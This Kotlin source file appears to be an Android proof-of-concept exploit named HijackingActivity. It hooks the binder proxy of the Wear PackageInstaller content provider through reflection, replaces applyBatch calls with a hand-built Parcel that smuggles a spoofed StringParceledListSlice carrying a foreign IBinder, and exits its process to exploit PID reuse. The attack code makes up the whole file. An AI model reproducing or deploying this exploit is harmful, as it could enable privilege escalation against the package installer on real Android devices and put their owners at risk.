package jp.plum.spoofpid

import android.content.ContentProviderOperation
import android.content.IContentProvider
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.util.Log
import diordna.content.pm.StringParceledListSlice
import kotlinx.coroutines.*
import org.jetbrains.anko.button
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout
import kotlin.system.exitProcess

/*
1. how to fix creator name
2. will IBinder as? Binder work
*/
class HijackingActivity : AppCompatActivity() {
    companion object {
        private const val authority = "com.google.android.packageinstaller.wear.provider"
        const val uri = "content://$authority"
        const val HijackingKey = "HijackingKey"
    }

    private val slice by lazy {
        StringParceledListSlice(
            "a b c d e f g".split(" "),
            intent.getIBinderExtra(MainActivity.BinderKey)
        ).also {
            it.setInlineCountLimit(2)
        }
    }

    private val request = arrayListOf(
        ContentProviderOperation.newDelete(
            Uri.parse(uri)
        ).build()
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        installResolver()

        verticalLayout {
            button("Apply Batch For PackageInstaller") {
                onClick {
                    // run on Dispatchers.IO  and ignore all exceptions
                    (GlobalScope + CoroutineExceptionHandler { _, _ -> }).launch(Dispatchers.IO) {
                        // will be hijacked by the install action
                        contentResolver.applyBatch(authority, request)
                    }
                    Log.e("natsuki", "commit applyBatch operation to package installer")
                    // ensure `applyBatch` already committed
                    delay(100L)
                    Log.e(
                        "natsuki",
                        "hijacker will quit this game with pid: ${android.os.Process.myPid()}"
                    )
                    exitProcess(0)
                }
            }
        }
    }


    private fun writeToParcel(list: List<ContentProviderOperation>): Parcel {
        val data = Parcel.obtain()
        data.writeInterfaceToken(IContentProvider.descriptor)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            attributionSource.writeToParcel(data, 0)
        }
        data.writeString(authority)
        data.writeInt(list.size)
        val (delete) = list
        data.writeInt(delete.type)
        Uri.writeToParcel(data, delete.uri)
        // ignore method
        data.writeInt(0)
        // ignore arg
        data.writeInt(0)
        // ignore value
        data.writeInt(-1)
        do {
            //*** begin extra
            data.writeInt(1) // size
            data.writeInt(1) // ArrayMap.size
            data.writeString("foobar") // key
            data.writeInt(4) // VAL_PARCELABLE
            data.writeString("android.content.pm.StringParceledListSlice") // parcel name
            slice.writeToParcel(data, 0)
            //*** end extra
        } while (false)
        // ignore selection
        data.writeInt(0)
        // ignore selection args
        data.writeInt(-1)
        // ignore expected count
        data.writeInt(-1)
        // ignore yield allowed
        data.writeInt(0)
        // ignore exception allowed
        data.writeInt(0)
        return data
    }


    private fun installResolver() {
        val proxy = contentResolver.acquireProvider(authority)
        val field = proxy.javaClass.getDeclaredField("mRemote")
        field.isAccessible = true
        val src = field.get(proxy) as IBinder
        val changed = installRemote(src)
        field.set(proxy, changed)
    }


    private fun installRemote(remote: IBinder): IBinder {
        return object : IBinder by remote {
            override fun transact(
                code: Int,
                data: Parcel,
                reply: Parcel,
                flags: Int
            ): Boolean {
                return if (code == IContentProvider.APPLY_BATCH_TRANSACTION) {
                    Log.e("natsuki", "begin transact")
                    remote.transact(
                        code,
                        writeToParcel(request)/* fixCreatorName(data) */,
                        reply,
                        flags
                    )
                } else {
                    remote.transact(code, data, reply, flags)
                }
            }
        }
    }

    fun fixCreatorName(src: Parcel): Parcel {
        val fixedBytes = src.marshall().foldIndexed(byteArrayOf()) { idx, acc, ele ->
            // find "diordna"
            if (ele == 'a'.toByte() && idx >= 6 && acc.copyOfRange(idx - 6, idx + 1)
                    .toList() == "diordna".toByteArray().toList()
            ) {
                Log.e("natsuki", "found @@@")
                acc[idx - 6] = 'a'.toByte()
                acc[idx - 5] = 'n'.toByte()
                acc[idx - 4] = 'd'.toByte()
                acc[idx - 3] = 'r'.toByte()
                acc[idx - 2] = 'o'.toByte()
                acc[idx - 1] = 'i'.toByte()
                acc[idx] = 'd'.toByte()
            }
            acc
        }
        val fixed = Parcel.obtain()
        fixed.unmarshall(fixedBytes, 0, fixedBytes.size)
        return fixed
    }

}